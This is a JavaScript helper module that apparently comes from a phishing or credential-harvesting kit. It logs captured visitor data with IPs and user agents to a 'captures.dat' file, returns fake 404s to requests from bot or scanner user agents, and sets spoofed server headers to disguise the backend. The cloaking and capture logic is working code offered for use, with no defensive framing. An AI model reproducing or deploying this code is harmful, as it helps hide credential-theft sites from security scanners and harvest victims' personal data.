// Developer: Sreeraj
// GitHub: https://github.com/s-r-e-e-r-a-j

import crypto from 'crypto';
import fs from 'fs-extra';
import path from 'path';
import { CONFIG, BOT_AGENTS } from '../config/index.js';
import { networkUtils } from './network.js';
import { fieldUtils } from './fields.js';

export const requestCount = new Map();

export const utils = {
    generateId() {
        return crypto.randomBytes(16).toString('hex');
    },

    generatePass() {
        return crypto.randomBytes(4).toString('hex');
    },

    async logData(type, data, ip, site, endpoint) {
        const entry = {
            timestamp: Date.now(),
            ip,
            site,
            endpoint,
            type,
            data,
            userAgent: data.userAgent || 'unknown'
        };
        
        const logFile = path.join(CONFIG.paths.data, 'captures.dat');
        await fs.appendFile(logFile, JSON.stringify(entry) + '\n');
        return entry;
    },

    filter(req, res, next) {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const ua = req.headers['user-agent'] || '';
        
        if (BOT_AGENTS.some(b => ua.toLowerCase().includes(b))) {
            return res.status(404).send('Not found');
        }
        
        const now = Date.now();
        const requests = requestCount.get(ip) || { count: 0, time: now };
        
        if (now - requests.time < 60000) {
            requests.count++;
            if (requests.count > 30) {
                return res.status(429).send('Too many requests');
            }
        } else {
            requests.count = 1;
            requests.time = now;
        }
        
        requestCount.set(ip, requests);
        next();
    },

    fakeHeaders(req, res, next) {
        res.setHeader('Server', 'nginx/1.20.1');
        res.setHeader('X-Powered-By', 'PHP/8.1.12');
        next();
    },

    // Network utilities
    killProcess: networkUtils.killProcess,
    checkInternet: networkUtils.checkInternet,
    downloadFile: networkUtils.downloadFile,
    checkPort: networkUtils.checkPort,
    detectPackageManager: networkUtils.detectPackageManager,
    installDeps: networkUtils.installDeps,

    // Field utilities
    normalizeFields: fieldUtils.normalizeFields
};
